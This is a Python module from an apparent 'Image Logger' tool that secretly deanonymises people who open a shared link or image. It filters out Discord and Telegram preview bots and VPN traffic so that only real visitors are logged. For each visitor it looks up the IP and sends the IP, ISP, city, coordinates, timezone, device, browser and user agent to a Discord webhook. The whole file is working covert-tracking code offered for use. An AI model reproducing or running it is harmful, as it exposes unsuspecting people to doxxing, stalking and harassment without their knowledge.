
import requests
import httpagentparser
from config import config

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, endpoint = "N/A", url = False, accept_language = "N/A"):
    if ip.startswith(config["blacklistedIPs"]):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [
            {
                "title": "Image Logger - IP Logged",
                "color": config["color"],
                "fields": [
                    {"name": "IP Address", "value": f"`{ip}`", "inline": True},
                    {"name": "Provider", "value": f"`{info['isp']}`", "inline": True},
                    {"name": "ASN", "value": f"`{info['as']}`", "inline": True},
                    {"name": "Location", "value": f"`{info['city']}, {info['regionName']}, {info['country']}`", "inline": True},
                    {"name": "Coordinates", "value": f"`{info['lat']}, {info['lon']}`", "inline": True},
                    {"name": "Timezone", "value": f"`{info['timezone'].split('/')[1].replace('_', ' ')} (UTC{info['offset']})`", "inline": True},
                    {"name": "Mobile?", "value": f"`{info['mobile']}`", "inline": True},
                    {"name": "VPN/Proxy?", "value": f"`{info['proxy']}`", "inline": True},
                    {"name": "Bot?", "value": f"`{info['hosting']}`", "inline": True},
                    {"name": "OS", "value": f"`{os}`", "inline": True},
                    {"name": "Browser", "value": f"`{browser}`", "inline": True},
                    {"name": "Languages", "value": f"`{accept_language}`", "inline": True},
                    {"name": "User Agent", "value": f"```\n{useragent}\n```", "inline": False},
                ]
            }
        ]
    }
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info
